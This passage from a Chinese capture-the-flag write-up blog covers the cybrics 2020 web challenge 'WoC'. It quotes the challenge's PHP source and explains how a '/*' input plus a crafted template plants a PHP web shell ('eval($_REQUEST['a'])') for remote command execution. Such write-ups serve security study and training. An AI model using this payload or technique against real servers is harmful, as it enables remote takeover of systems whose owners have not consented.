+        <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'share'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$calc</span> <span class="token operator">=</span> <span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"calcs/$userid/$calc.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;script>var preloadValue = &lt;?=json_encode((string)($field))?>;&lt;/script>\n"</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"inc/calclib.html"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"calcs/$userid/templates/$template.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">redir</span><span class="token punctuation">(</span><span class="token string">"?p=sharelink&amp;calc=$calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $field;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string">"ERROR"</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$value</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    
+    <span class="token keyword">echo</span> <span class="token string">"&lt;script>var preloadValue = "</span> <span class="token punctuation">.</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">";&lt;/script>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">require</span> <span class="token string">"inc/calclib.html"</span><span class="token punctuation">;</span>
+<span class="token keyword">require</span> <span class="token string">"calcs/$userid/templates/$template.html"</span><span class="token punctuation">;</span>
+</code></pre>
+<p>field就是要计算的数据，有一个超级正则表达式，不仅完全看不懂，放到正则可视化里面还报错，呜呜呜<br>能看懂的就是允许+-*/几个运算符号，然后还有sin cos几个数学函数，但是要什么开头什么结尾的，完全看不懂。。<br>如果能过这个超级正则就可以进入到eval里面，但是我真的看不懂啊呜呜呜，既然上了一个超级正则，那么可攻击的点应该就不是这</p>
+<p>然后我们看到如果post的了一个share，会调用另一个危险函数file_put_contents，其将我们现在的算式filed存起来，并且拼接现有的计算器模板生成一个PHP文件，而又存在一个newtemplate.php可供我们自己操作，生成可控的模板，既然是生成PHP文件，自然就有很大的操作空间，比如getshell什么的<br>newtemplate.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">redir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$userid</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$error</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'html'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">do</span> <span class="token punctuation">{</span>
+        <span class="token variable">$html</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'html'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$html</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">"Bad chars"</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        
+        <span class="token variable">$requiredBlocks</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
+            <span class="token string">'id="back"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="field" name="field"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="digit0"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="digit1"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="digit2"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="digit3"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="digit4"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="digit5"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="digit6"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="digit7"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="digit8"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="digit9"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="plus"'</span><span class="token punctuation">,</span>
+            <span class="token string">'id="equals"'</span><span class="token punctuation">,</span>
+        <span class="token punctuation">]</span><span class="token punctuation">;</span>
+        
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requiredBlocks</span> <span class="token keyword">as</span> <span class="token variable">$block</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$html</span><span class="token punctuation">,</span> <span class="token variable">$block</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">"Missing required block: '$block'"</span><span class="token punctuation">;</span>
+                <span class="token keyword">break</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        
+        <span class="token variable">$uuid</span> <span class="token operator">=</span> <span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"calcs/$userid/templates/$uuid.html"</span><span class="token punctuation">,</span> <span class="token variable">$html</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">"Unexpected error! Contact orgs to fix. cybrics.net/rules#contacts"</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        
+        <span class="token function">redir</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>没啥太多功能，就是写一个随机文件名的html，但是文件名会在inside.php里面回显出来，不必担心，写入的唯一限制就是不能出现&lt;?标签，这样子的话就没法构造PHP文件了，但是看回这一句</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"calcs/$userid/$calc.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;script>var preloadValue = &lt;?=json_encode((string)($field))?>;&lt;/script>\n"</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"inc/calclib.html"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"calcs/$userid/templates/$template.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>这里在最开始写入了一句<code>&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n</code><br>并且field虽然有一个超级正则但勉强可控，而它为我们提供了一个标签&lt;?&#x3D;，如果我们能够把这个标签保留下来，在后面自己创建的模板中就可以为所欲为了<br>而很有意思的是，&#x2F;*这两个符号一个是除号一个是乘号，虽然我也不知道这个超级正则怎么允许两个运算符连起来，但是的确这个注释符是可以过正则的，那么我们就注释掉了题目限制的闭合，后面拼接上我们带有shell的html就可以了</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>在newtemplate.php中新建一个内容为</p>
+<pre><code>*/ eval($_REQUEST[&#39;a&#39;]); ?&gt; 
+&#39;id=&quot;back&quot;&#39;,
+            &#39;id=&quot;field&quot; name=&quot;field&quot;&#39;,
+            &#39;id=&quot;digit0&quot;&#39;,
+            &#39;id=&quot;digit1&quot;&#39;,
+            &#39;id=&quot;digit2&quot;&#39;,
+            &#39;id=&quot;digit3&quot;&#39;,
+            &#39;id=&quot;digit4&quot;&#39;,
+            &#39;id=&quot;digit5&quot;&#39;,
+            &#39;id=&quot;digit6&quot;&#39;,
+            &#39;id=&quot;digit7&quot;&#39;,
+            &#39;id=&quot;digit8&quot;&#39;,
+            &#39;id=&quot;digit9&quot;&#39;,
+            &#39;id=&quot;plus&quot;&#39;,
+            &#39;id=&quot;equals&quot;&#39;,
+</code></pre>
+<p>的html文档，然后在calc.php中post一个share，令field为&#x2F;*，会回显写入PHP文件的路径，访问执行命令即可getshell</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret.html" rel="prev" title="[CISCN2019 华东南赛区]Double Secret">
+      <i class="fa fa-chevron-left"></i> [CISCN2019 华东南赛区]Double Secret
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%5BRCTF%202019%5DNextphp.html" rel="next" title="[RCTF 2019]Nextphp">
+      [RCTF 2019]Nextphp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#cybrics-2020-web-wp"><span class="nav-number">1.</span> <span class="nav-text">[cybrics 2020] web wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Hunt"><span class="nav-number">1.1.</span> <span class="nav-text">Hunt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gif2png"><span class="nav-number">1.2.</span> <span class="nav-text">Gif2png</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="nav-number">1.2.1.</span> <span class="nav-text">思路一（失败）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C%EF%BC%88%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">1.2.2.</span> <span class="nav-text">思路二（命令注入）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#trick1"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">trick1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#trick2"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">trick2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WoC"><span class="nav-number">1.3.</span> <span class="nav-text">WoC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">1.3.1.</span> <span class="nav-text">payload</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
